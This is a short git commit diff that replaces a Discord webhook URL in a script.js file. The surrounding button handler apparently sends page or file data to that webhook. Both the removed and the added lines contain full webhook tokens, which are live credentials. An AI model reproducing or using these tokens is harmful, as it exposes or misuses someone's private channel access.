a0d20f3b6fc64042156cb097c49a7b8a3eda3825
noslen <brainrotzelensky@gmail.com>
2025-11-09 00:47:36 +0100

    Update webhook URL in script.js

--- script.js
+++ script.js
@@ -1,4 +1,4 @@
-const webhookURL = "https://discord.com/api/webhooks/1436062226384687265/hxMrWuQGylXzM4XkdE2ko-Z0HWEO674NfC_r_qcOY6_hIl--KTCOQIisbRF16w2KIvsv";
+const webhookURL = "https://discord.com/api/webhooks/1436864546152124617/nkcWayq-iKeKiJOKzveXAb6kHIhsqJrqOEHS6vEYonm8f8sDnHZbp-x7ErhkkKFZ6s9O";
 
 const btn = document.getElementById("copyBtn");
 const gf = document.getElementById("File");
@@ -49,3 +49,4 @@ btn.onclick = async () => {
     showToast("Send failed ❌", false);
   }
 };
+
